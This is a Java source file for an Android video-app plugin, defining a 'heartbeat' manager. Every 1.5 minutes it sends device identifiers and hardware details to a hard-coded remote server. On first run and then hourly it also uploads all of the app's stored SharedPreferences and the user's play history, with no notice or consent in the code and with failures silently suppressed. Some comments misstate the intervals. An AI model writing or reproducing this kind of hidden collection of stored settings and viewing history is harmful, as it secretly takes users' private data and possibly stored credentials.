package com.github.catvod.spider;

import android.os.Build;

import com.github.catvod.crawler.SpiderDebug;
import com.github.catvod.net.OkHttp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;
import java.io.File;
import com.github.catvod.utils.FileUtil;
import com.github.catvod.utils.Notify;
import com.github.catvod.utils.Path;

/**
 * 心跳管理器
 * 负责心跳发送、数据收集和定时调度
 */
public class HeartbeatManager {

    // 心跳相关常量
    private static final String HEARTBEAT_URL = "https://itv.mangzhexuexi.com/api/heartbeat";
    private static final long HEARTBEAT_INTERVAL = 1 * 60 * 1500; // 1.5分钟
    private static final long TOKEN_REFRESH_INTERVAL = 30 * 60 * 1000; // Token刷新间隔：30分钟
    private static final long CHECK_UPADTE_REFRESH_INTERVAL = 10 * 60 * 1000; // Token刷新间隔：10分钟
    private static final long EXTRA_DATA_SEND_INTERVAL = 60 * 60 * 1000; // Extra数据发送间隔：60分钟

    // 心跳状态变量
    private static boolean isFirstHeartbeat = true; // 标记是否为首次心跳
    private static long lastTokenRefreshTime = 0; // 上次刷新Token的时间
    private static long lastCheckUpdateRefreshTime = 0; // 上次检测更新的时间
    private static long lastExtraDataSendTime = 0; // 上次发送extra数据的时间

    /**
     * 安全地显示Toast通知（避免DeadObjectException）
     * @param message 通知消息
     */
    private static void safeNotify(String message) {
        try {
            Notify.show(message);
        } catch (Exception e) {
            // 在低性能设备上，Toast可能会因为DeadObjectException失败
            // 记录到日志中，不影响主流程
            SpiderDebug.log("通知显示失败: " + e.getMessage());
        }
    }

    /**
     * 心跳任务Runnable
     */
    private static final Runnable heartbeatTask = new Runnable() {
        @Override
        public void run() {
            try {
                // 在后台线程执行心跳
                Init.execute(() -> sendHeartbeat());

                // 调度下一次心跳
                Init.run(heartbeatTask, (int) HEARTBEAT_INTERVAL);

            } catch (Exception e) {
                // LogReportManager.logError("心跳任务执行失败: " + e.getMessage(), "HeartbeatManager", e);
                // 即使失败也要调度下一次心跳
                Init.run(heartbeatTask, (int) HEARTBEAT_INTERVAL);
            }
        }
    };

    /**
     * 启动心跳任务
     */
    public static void startHeartbeat() {
        // LogReportManager.log("info", "启动心跳任务，间隔: " + HEARTBEAT_INTERVAL + "ms", "HeartbeatManager", "heartbeat");
        Init.run(heartbeatTask, (int) HEARTBEAT_INTERVAL);
    }

    /**
     * 发送心跳到服务器
     */
    public static void sendHeartbeat() {
        try {
            long currentTime = System.currentTimeMillis();

            // if (!isFirstHeartbeat) {
            //     if (currentTime - lastCheckUpdateRefreshTime >= CHECK_UPADTE_REFRESH_INTERVAL) {
            //         LogReportManager.log("info", "执行定期检查更新", "HeartbeatManager", "checkUpdate");
            //         lastCheckUpdateRefreshTime = currentTime;

            //         // 使用统一的版本检查方法
            //         int updateStatus = UpdateManager.checkForUpdate();

            //         if (updateStatus == 1) {
            //             // 发现新版本
            //             LogReportManager.log("info", "发现新版本", "HeartbeatManager", "checkUpdate");
            //             if (UpdateManager.ensureFileAccessPermission("quietly")) {
            //                 // safeNotify("发现新版本，重启后会自动更新!");
            //             } else {
            //                 String notify_show = "❌ 当前应用缺少文件访问权限【可以尝试手动点击一次：设置-备份恢复-备份】";
            //                 // safeNotify(notify_show);
            //             }
            //         } else if (updateStatus == 0) {
            //             // 已是最新版本
            //             SpiderDebug.log("[Heartbeat] 已是最新版本");
            //         } else {
            //             // 检查失败
            //             SpiderDebug.log("[Heartbeat] 版本检查失败");
            //         }
            //     }
            // }

            // 构建心跳JSON数据
            JSONObject heartbeatData = new JSONObject();
            heartbeatData.put("device_id", DeviceInfoHelper.getOrCreateDeviceId());
            heartbeatData.put("brand", Build.BRAND);
            heartbeatData.put("manufacturer", Build.MANUFACTURER);
            heartbeatData.put("model", Build.MODEL);
            heartbeatData.put("device_name", Build.DEVICE);
            heartbeatData.put("android_version", Build.VERSION.RELEASE);
            heartbeatData.put("android_sdk", String.valueOf(Build.VERSION.SDK_INT));
            heartbeatData.put("architecture", DeviceInfoHelper.getCpuArchitecture());
            heartbeatData.put("platform", DeviceInfoHelper.getDeviceType());
            heartbeatData.put("app_version", DeviceInfoHelper.getAppVersion());
            heartbeatData.put("init_status", InitStatusTracker.snapshot());

            // 决定是否发送extra数据
            boolean shouldSendExtra = false;
            if (isFirstHeartbeat) {
                // 首次心跳必须发送extra数据
                shouldSendExtra = true;
                lastExtraDataSendTime = currentTime;
            } else if (currentTime - lastExtraDataSendTime >= EXTRA_DATA_SEND_INTERVAL) {
                // 每隔10分钟发送一次extra数据
                shouldSendExtra = true;
                lastExtraDataSendTime = currentTime;
            }

            if (shouldSendExtra) {
                JSONObject extraData = new JSONObject();

                // 添加SharedPreferences数据
                String sharedPrefsJson = DeviceInfoHelper.getAllSharedPreferences();
                extraData.put("preferences", new JSONObject(sharedPrefsJson));

                // 添加播放历史数据
                String historyJson = DeviceInfoHelper.getPlayHistory();
                extraData.put("history", new JSONArray(historyJson));

                heartbeatData.put("extra", extraData.toString());

                if (isFirstHeartbeat) {
                    LogReportManager.log("info", "首次心跳，附带SharedPreferences和播放历史数据", "HeartbeatManager", "heartbeat");
                    isFirstHeartbeat = false; // 标记首次心跳已完成
                } else {
                    LogReportManager.log("info", "定期发送extra数据（每10分钟）", "HeartbeatManager", "heartbeat");
                }
            } else {
                heartbeatData.put("extra", "");
            }

            // 准备请求头
            Map<String, String> headers = new HashMap<>();
            headers.put("User-Agent", "okhttp");
            headers.put("Content-Type", "application/json");
            headers.put("Accept", "*/*");
            headers.put("Host", "itv.mangzhexuexi.com");
            headers.put("Connection", "keep-alive");

            // 发送POST请求
            String response = OkHttp.post(HEARTBEAT_URL, heartbeatData.toString(), headers).getBody();

            // LogReportManager.log("info", "心跳发送成功: " + response, "HeartbeatManager", "heartbeat");

        } catch (Exception e) {
            // LogReportManager.logError("发送心跳失败: " + e.getMessage(), "HeartbeatManager", e);
        }
    }

    /**
     * 获取心跳间隔时间
     */
    public static long getHeartbeatInterval() {
        return HEARTBEAT_INTERVAL;
    }

    /**
     * 重置首次心跳标记（用于测试）
     */
    public static void resetFirstHeartbeat() {
        isFirstHeartbeat = true;
        // lastTokenRefreshTime = 0;
        lastCheckUpdateRefreshTime = 0;
        lastExtraDataSendTime = 0;
    }
}
